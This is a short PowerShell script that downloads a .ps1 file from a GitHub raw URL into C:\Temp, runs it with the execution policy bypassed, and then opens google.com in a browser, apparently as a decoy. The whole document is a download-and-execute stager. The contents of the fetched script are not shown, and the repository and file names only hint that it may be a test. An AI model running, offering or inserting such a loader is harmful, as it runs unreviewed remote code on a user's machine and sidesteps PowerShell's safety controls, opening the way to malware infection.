Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Manh130902/CaMtest/refs/heads/master/testlocal1.ps1' -OutFile 'C:\Temp\testlocal1.ps1'
powershell -ExecutionPolicy Bypass -File "C:\Temp\testlocal1.ps1"
Start-Process 'https://www.google.com'
